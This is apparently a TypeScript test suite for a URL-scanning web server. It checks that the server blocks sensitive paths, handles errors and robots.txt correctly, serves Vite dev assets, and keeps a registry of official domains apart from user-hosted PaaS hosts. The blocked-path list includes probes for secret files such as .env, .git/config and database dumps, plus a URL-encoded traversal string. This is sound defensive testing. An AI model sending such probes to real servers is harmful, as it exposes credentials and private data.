    // Sensitive paths & dotfiles & backups & traversal MUST be rejected
    for (const blockedPath of [
      '/.env',
      '/.git/config',
      '/server.ts',
      '/package.json',
      '/backup.sql',
      '/database.sqlite',
      '/server/scanManager.ts',
      '/..%2f.env',
    ]) {
      const r = await fetch(`${base}${blockedPath}`);
      assert.ok(
        r.status === 400 || r.status === 403,
        `Expected 400/403 for ${blockedPath}, got ${r.status}`
      );
    }

    // Real HTTP status codes on error pages & unknown pages (never 200!)
    const err404Unknown = await fetch(`${base}/definitely-missing-page-xyz`);
    assert.equal(err404Unknown.status, 404, 'Unknown path must return real HTTP 404');

    const err403Preview = await fetch(`${base}/error/403`);
    assert.equal(err403Preview.status, 403);

    const err500Preview = await fetch(`${base}/error/500`);
    assert.equal(err500Preview.status, 500);

    // SEO robots.txt & sitemap.xml
    const robots = await fetch(`${base}/robots.txt`);
    assert.equal(robots.status, 200);
    const robotsText = await robots.text();
    assert.ok(robotsText.includes('Disallow: /api/'));
    assert.ok(robotsText.includes('Disallow: /history'));
    assert.ok(robotsText.includes('Sitemap:'));

    const sitemap = await fetch(`${base}/sitemap.xml`);
    assert.equal(sitemap.status, 200);
    const sitemapText = await sitemap.text();
    assert.ok(sitemapText.includes('<urlset'));
    assert.ok(sitemapText.includes('/about'));
    assert.ok(sitemapText.includes('/privacy'));

    // Malformed / invalid scan payload rejections
    const badContentType = await fetch(`${base}/api/scans`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: 'https://example.com',
    });
    assert.equal(badContentType.status, 415);

    const badJson = await fetch(`${base}/api/scans`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: '' }),
    });
    assert.equal(badJson.status, 400);
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
  }
});

// 26. Vite Dev Mode Module & Pre-Bundled Deps Regression Test (prevents white screen from dotfile shield)
test('26. Vite dev server serves index, /src/main.tsx, and /node_modules/.vite/deps/* while still blocking secrets', async () => {
  const app = await createApp({ enableVite: true, viteHmr: false });
  const srv = http.createServer(app);
  await new Promise<void>((resolve) => srv.listen(0, '127.0.0.1', resolve));
  const addr = srv.address() as { port: number };
  const base = `http://127.0.0.1:${addr.port}`;

  try {
    const home = await fetch(`${base}/`);
    assert.equal(home.status, 200);
    const homeHtml = await home.text();
    assert.ok(homeHtml.includes('/src/main.tsx'));

    const mainTsx = await fetch(`${base}/src/main.tsx`);
    assert.equal(mainTsx.status, 200);
    const mainCode = await mainTsx.text();

    // Extract actual Vite pre-bundled dep path (e.g. /node_modules/.vite/deps/react-dom_client.js?v=...)
    const depMatch = mainCode.match(/\/node_modules\/\.vite\/deps\/[^"'\s]+/);
    assert.ok(depMatch, 'Expected transformed /src/main.tsx to reference /node_modules/.vite/deps/...');

    const depRes = await fetch(`${base}${depMatch[0]}`);
    assert.equal(depRes.status, 200, `Vite pre-bundled dep ${depMatch[0]} must return 200, not 403`);

    const dotEnvRes = await fetch(`${base}/.env`);
    assert.equal(dotEnvRes.status, 403);

    const sneakyDotEnvRes = await fetch(`${base}/node_modules/.vite/deps/.env`);
    assert.equal(sneakyDotEnvRes.status, 403);
  } finally {
    await new Promise<void>((resolve, reject) => srv.close((err) => (err ? reject(err) : resolve())));
    await app.locals.viteServer?.close?.();
  }
});

// 27. Expanded Verified Official Domain Registry Scale, Cross-Sector Coverage & PaaS Isolation
test('27. Expanded Official Domain Registry verifies 400+ official domains while isolating PaaS user hosts', () => {
  const stats = getOfficialRegistryStats();
  assert.ok(stats.officialDomainCount >= 400, `Expected >=400 official domains, got ${stats.officialDomainCount}`);
  assert.ok(stats.entityCount >= 35, `Expected >=35 official entities, got ${stats.entityCount}`);
  assert.ok(stats.authorizedProviderCount >= 11, `Expected >=11 authorized third-party providers`);

  const verifiedSamples = [
    'openai.com',
    'chatgpt.com',
    'claude.ai',
    'huggingface.co',
    'vercel.com',
    'gitlab.com',
    'docker.com',
    'pypi.org',
    'alrajhibank.com.sa',
    'riyadbank.com',
    'alinma.com',
    'emiratesnbd.com',
    'nbe.com.eg',
    'instapay.eg',
    'stc.com.sa',
    'nafath.sa',
    'zatca.gov.sa',
    'digital.gov.eg',
    'u.ae',
    'gov.uk',
    'nasa.gov',
    'virustotal.com',
    'letsencrypt.org',
    'binance.com',
    'kraken.com',
    'etherscan.io',
    'saudia.com',
    'emirates.com',
    'aljazeera.net',
    'mit.edu',
    'ksu.edu.sa',
  ];

  for (const host of verifiedSamples) {
    const own = lookupDomainOwnership(host);
    assert.equal(own.matched, true, `Expected ${host} to be verified in Official Domain Registry`);
    assert.equal(own.isUserContentPaas, false, `Expected ${host} NOT to be marked as user-content PaaS`);
  }

  // Multi-tenant PaaS / user-hosted domains must NEVER verify as official corporate domains
  const paasHosts = [
    'phishing-demo.hf.space',
    'fake-login.vercel.app',
    'untrusted-app.up.railway.app',
    'custom-site.gitlab.io',
    'example-blog.wordpress.com',
    'attacker-test.web.app',
  ];
  for (const host of paasHosts) {
    const own = lookupDomainOwnership(host);
    assert.equal(own.matched, false, `PaaS user host ${host} must NOT verify as an official corporate portal`);
    assert.equal(own.isUserContentPaas, true, `PaaS user host ${host} must flag isUserContentPaas=true`);
  }

  // Parent/product relationships and SSO integrations
  assert.equal(classifyDomainRelationship('openai.com', 'chatgpt.com').isSameOrganization, true);
  assert.equal(classifyDomainRelationship('anthropic.com', 'claude.ai').isSameOrganization, true);
  assert.equal(classifyDomainRelationship('unrelated-app.example', 'nafath.sa').relationship, 'external_integration');
  assert.equal(classifyDomainRelationship('unrelated-app.example', 'js.hcaptcha.com').relationship, 'authorized_third_party_provider');
});


